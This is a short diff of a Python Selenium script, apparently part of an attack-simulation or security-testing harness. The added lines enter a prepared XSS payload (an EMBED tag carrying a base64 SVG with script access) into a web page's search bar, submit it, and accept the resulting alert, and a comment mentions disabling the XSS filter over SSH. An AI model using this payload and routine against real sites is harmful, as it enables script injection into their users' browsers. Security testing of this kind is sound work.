@@ -606,6 +606,12 @@ def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
         attack = "<EMBED SRC=\"data:image/svg+xml;base64," + base64decodeString + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
     
     # 3-2. attack in search bar
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[4]/form/div/input').clear()
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[4]/form/div/input').send_keys(attack)
+    random_sleep()
+    driver.find_element_by_xpath('//*[@id="searchButton"]').click()
+    random_sleep()
+    driver.switch_to_alert().accept()
     
     #4 turn of the xxs filter
     ssh = paramiko.SSHClient()
